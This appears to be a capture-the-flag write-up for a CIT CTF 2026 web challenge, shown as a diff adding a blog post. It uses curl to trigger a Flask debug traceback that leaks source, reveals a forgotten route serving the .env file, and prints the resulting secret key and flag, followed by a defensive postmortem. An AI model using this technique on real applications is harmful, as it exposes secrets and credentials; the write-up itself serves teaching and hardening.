@@ -1,0 +1,61 @@
+---
+title: "CIT CTF 2026 · Debug Disaster: a leaky debug page and a forgotten route"
+description: Flask debug=True leaks more than tracebacks — it leaked the source code of a forgotten route that dumps .env in cleartext.
+pubDate: 2026-05-10
+tags: [CTF, cit-ctf-2026, web, flask]
+series: CIT CTF 2026
+---
+
+import Callout from '../../../components/Callout.astro';
+
+The challenge description tells you both halves of the bug:
+
+> Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure.
+
+"Forgot to turn off debug" and "forgot to remove something" map directly to the two stages of the exploit.
+
+## Approach
+
+With Flask `debug=True` enabled, any unhandled exception renders Werkzeug's interactive traceback page — source code included. Trip an exception:
+
+```bash
+curl -sS http://23.179.17.92:5002/admin > /tmp/debug.html
+```
+
+The `/admin` handler raises directly. The traceback exposes a slice of `/app/app.py`:
+
+```python
+@app.route("/admin")
+def admin():
+    raise Exception("Debug leak triggered: Dirbuster maybe in your future!")
+
+@app.route("/flg_bar")
+def env():
+    return open(".env").read(), 200, {"Content-Type": "text/plain"}
+```
+
+The second half — "something I forgot to remove" — is a route at `/flg_bar` that returns `.env` verbatim.
+
+<Callout type="info">
+  The two hints are separate. The debug page alone doesn't give you the flag. The value of the debug page is that it leaks source code you wouldn't otherwise see, and that source code reveals the `/flg_bar` route.
+</Callout>
+
+## Exploit
+
+```bash
+curl -sS http://23.179.17.92:5002/flg_bar
+```
+
+```
+SECRET_KEY=supersecret
+FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
+DATABASE_URL=sqlite:///prod.db
+```
+
+`CIT{H1dd3n_D1r5_3v3rywh3r3}`
+
+## Postmortem
+
+- Werkzeug debug mode leaking into production is one of those evergreen OWASP entries — they've stopped bothering to file new CVEs for it.
+- "Forgotten routes" are a real-world failure mode. Plenty of internal-only routes (`/healthz`, `/debug/env`, `/admin/_internal`) live in the same codebase as public ones and are gated by env vars. When the env var flips wrong in production, the gate itself becomes the attack surface.
+- For your own Flask apps, keep `.env` out of the web root — drop it under `/etc/` or a parent directory, and have `python-dotenv` read it once at startup.
